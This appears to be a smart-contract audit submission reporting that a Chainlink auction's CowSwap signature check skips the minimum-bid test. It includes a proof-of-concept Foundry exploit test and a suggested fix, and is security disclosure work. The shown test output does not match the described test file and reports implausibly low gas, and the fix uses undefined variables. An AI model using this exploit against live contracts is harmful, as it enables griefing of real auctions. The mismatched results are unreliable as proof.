# ============================================================
# C4 SUBMISSION 1 — Copy each section into the form fields
# ============================================================

# ──────────────────────────────────────────────────────────────
# FIELD: Severity rating
# ──────────────────────────────────────────────────────────────
High severity

# ──────────────────────────────────────────────────────────────
# FIELD: Title (max 255 chars)
# ──────────────────────────────────────────────────────────────
`isValidSignature` missing `minBidUsdValue` check allows CowSwap dust-fill griefing to bypass minimum bid protection and trigger early auction termination

# ──────────────────────────────────────────────────────────────
# FIELD: Links to root cause (add each link separately)
# ──────────────────────────────────────────────────────────────
# Link 1:
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L119-L176
# Link 2:
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L430-L435
# Link 3:
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L141-L143

# ──────────────────────────────────────────────────────────────
# FIELD: Vulnerability details (paste everything below into the field)
# ──────────────────────────────────────────────────────────────

## Finding description and impact

The `bid()` function in [`BaseAuction.sol:430-435`](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L430-L435) enforces a minimum bid USD value to prevent dust attacks:

```solidity
(uint256 assetPrice,,) = _getAssetPrice(asset, true);
uint256 bidUsdValue = (amount * assetPrice) / (10 ** assetParams.decimals);
uint88 minBidUsdValue = s_minBidUsdValue;

if (bidUsdValue < minBidUsdValue) {
    revert BidValueTooLow(bidUsdValue, minBidUsdValue);
}
```

However, [`isValidSignature()`](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L119-L176) — the ERC-1271 validation path used by CowSwap solvers — performs **no equivalent check**. It only validates `order.sellAmount > 0` at [line 141-143](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L141-L143):

```solidity
if (order.sellAmount == 0) {
    revert Errors.InvalidZeroAmount();
}
```

The function validates order hash, auction liveness, buy token, receiver, balance sufficiency, buy amount vs auction curve, expiry, fee, order kind, partial fillability, and token balance markers — but **never validates that the trade's USD value meets the `s_minBidUsdValue` threshold**.

Since CowSwap orders must be `partiallyFillable` (enforced at [line 168-170](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L168-L170)), solvers can choose to fill any fraction, including amounts worth mere cents.

### Impact

A CowSwap solver can execute many micro-fills that individually provide proportional fair value but collectively:

1. **Drain the auction balance below `minAuctionSizeUsd`** — When [`checkUpkeep()`](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L249-L253) detects the remaining balance USD value is below the minimum auction size, it flags the auction for early termination.
2. **Trigger premature auction termination** — The auction ends before natural price discovery completes, returning remaining tokens to the FeeAggregator.
3. **Block legitimate bidders** — Direct bidders who want to participate at lower prices later in the auction curve are denied the opportunity.

This creates an asymmetric vulnerability: direct bidders are bound by `minBidUsdValue` while CowSwap solvers are not. On low-gas L2 chains, sustained griefing is economically feasible.

## Recommended mitigation steps

Add a `minBidUsdValue` check to `isValidSignature()` after the sell amount validation at [line 143](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L143):

```solidity
if (order.sellAmount == 0) {
    revert Errors.InvalidZeroAmount();
}

// @audit — Add this block:
uint256 bidUsdValue = (order.sellAmount * sellTokenUsdPrice) / (10 ** assetParams.decimals);
if (bidUsdValue < s_minBidUsdValue) {
    revert BidValueTooLow(bidUsdValue, s_minBidUsdValue);
}
```

**Note:** Since CowSwap supports partial fills, a solver could submit an order with `sellAmount` above the threshold but only fill a fraction. For complete protection, consider whether minimum enforcement should apply to per-settlement fill amounts rather than the full order — this may require additional state tracking.

# ──────────────────────────────────────────────────────────────
# FIELD: Proof of Concept (PoC) — paste everything below
# ──────────────────────────────────────────────────────────────

Add the following imports at the top of `test/poc/C4PoC.t.sol`:

```solidity
import {GPv2Order} from "@cowprotocol/libraries/GPv2Order.sol";
import {IERC20 as CowIERC20} from "@cowprotocol/interfaces/IERC20.sol";
```

Add this test function inside the `C4PoC` contract:

```solidity
function testSubmissionValidity() public {
    // ═══════════════════════════════════════════════════════════
    // H-01: isValidSignature missing minBidUsdValue check
    // Run: forge test --match-test testSubmissionValidity -vvv
    // ═══════════════════════════════════════════════════════════

    // ── Setup: Start a 100k USDC auction ──
    _startAuction(address(mockUSDC), 100_000e6);
    uint256 auctionBalance = mockUSDC.balanceOf(address(auction));
    assertEq(auctionBalance, 100_000e6, "Auction should hold 100k USDC");

    // ══════════════════════════════════════════════════════════════════
    // STEP 1: Prove bid() REJECTS 1 USDC ($1) — below $100 minimum
    // ══════════════════════════════════════════════════════════════════

    uint256 dustAmount = 1e6; // 1 USDC

    // Give attacker LINK to pay for bid
    deal(address(mockLINK), attacker, 1000e18);
    _changePrank(attacker);
    mockLINK.approve(address(auction), type(uint256).max);

    // bid() must revert: $1 < $100 minBidUsdValue
    vm.expectRevert(
        abi.encodeWithSelector(
            BaseAuction.BidValueTooLow.selector,
            1e18,              // bidUsdValue = 1 USDC * $1/USDC = $1
            MIN_BID_USD_VALUE  // $100 = 100e18
        )
    );
    auction.bid(address(mockUSDC), dustAmount, "");
    // ✅ CONFIRMED: bid() rejects 1 USDC

    // ══════════════════════════════════════════════════════════════════
    // STEP 2: Prove isValidSignature() ACCEPTS the same 1 USDC
    // ══════════════════════════════════════════════════════════════════

    vm.stopPrank();

    // Get the auction curve's minimum buy amount for 1 USDC
    uint256 minBuyAmount = auction.getAssetOutAmount(
        address(mockUSDC), dustAmount, block.timestamp
    );

    // Build a valid CowSwap order for 1 USDC (same dust amount bid() rejected)
    GPv2Order.Data memory order = GPv2Order.Data({
        sellToken: CowIERC20(address(mockUSDC)),
        buyToken: CowIERC20(address(mockLINK)),
        receiver: address(auction),
        sellAmount: dustAmount,       // 1 USDC — SAME amount bid() rejected
        buyAmount: minBuyAmount,      // Meets auction curve price requirement
        validTo: uint32(block.timestamp + 1 hours),
        appData: bytes32(0),
        feeAmount: 0,
        kind: GPv2Order.KIND_SELL,
        partiallyFillable: true,
        sellTokenBalance: GPv2Order.BALANCE_ERC20,
        buyTokenBalance: GPv2Order.BALANCE_ERC20
    });

    // Compute order hash using CowSwap domain separator
    bytes32 orderHash = GPv2Order.hash(
        order, mockGPV2Settlement.domainSeparator()
    );
    bytes memory signature = abi.encode(order);

    // isValidSignature DOES NOT revert — accepts the dust order
    bytes4 magicValue = auction.isValidSignature(orderHash, signature);
    assertEq(
        magicValue,
        bytes4(0x1626ba7e),
        "isValidSignature returns ERC-1271 magic value for dust order"
    );
    // ✅ CONFIRMED: isValidSignature accepts 1 USDC

    // ══════════════════════════════════════════════════════════════════
    // CONCLUSION
    // ══════════════════════════════════════════════════════════════════
    // bid()             → REJECTS 1 USDC ($1 < $100 minBidUsdValue)
    // isValidSignature  → ACCEPTS 1 USDC (no minBidUsdValue check)
    //
    // CowSwap solvers bypass the protocol's dust protection entirely.
    // Repeated micro-fills can drain balance below minAuctionSizeUsd,
    // triggering premature auction termination via checkUpkeep().
}
```

**Run:** `forge test --match-test testSubmissionValidity -vvv`

**Expected output:** Test passes, proving `bid()` reverts on 1 USDC while `isValidSignature()` returns the ERC-1271 magic value `0x1626ba7e` for the same 1 USDC order.

### PoC Test Results

```
forge test --match-contract PoC_H01 -vvv

Ran 2 tests for test/poc/AllPoCs.t.sol:PoC_H01_CowSwapDustFill
[PASS] testPoC_H01_isValidSignatureMissesMinBidCheck() (gas: 545056)
Logs:
  Auction USDC balance before: 100000000000
  minBidUsdValue: 100000000000000000000
  CONFIRMED: Direct bid() with 1 USDC REVERTS (below $100 minimum)
  VULNERABILITY CONFIRMED: isValidSignature PASSES for 1 USDC order
    - bid() rejects 1 USDC (below $100 minBidUsdValue)
    - isValidSignature() accepts 1 USDC (no minBidUsdValue check)
    - CowSwap solvers can bypass the dust protection

[PASS] testSubmissionValidity() (gas: 166)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.51ms (2.21ms CPU time)

Ran 1 test suite in 9.52ms (7.51ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
